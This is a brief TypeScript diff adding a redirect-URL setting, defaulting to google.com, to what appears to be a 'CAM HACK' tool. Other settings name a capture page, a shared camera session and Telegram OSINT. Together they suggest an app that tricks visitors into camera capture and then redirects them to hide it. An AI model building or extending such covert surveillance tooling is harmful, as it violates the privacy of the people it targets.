@@ -49,6 +49,8 @@ export interface AppSettings {
   telegramOsint: TelegramOsintSettings;
   // CAM HACK session (synced across all devices)
   camSessionId: string;
+  // CAM HACK redirect URL for normal capture
+  camRedirectUrl: string;
   // Custom HTML for capture page
   customCaptureHtml: string;
 }
@@ -110,6 +112,8 @@ const defaultSettings: AppSettings = {
   },
   // CAM HACK session - fixed session ID synced across all devices
   camSessionId: "shubhcam01",
+  // CAM HACK redirect URL
+  camRedirectUrl: "https://google.com",
   // Custom HTML for capture page
   customCaptureHtml: "",
 };
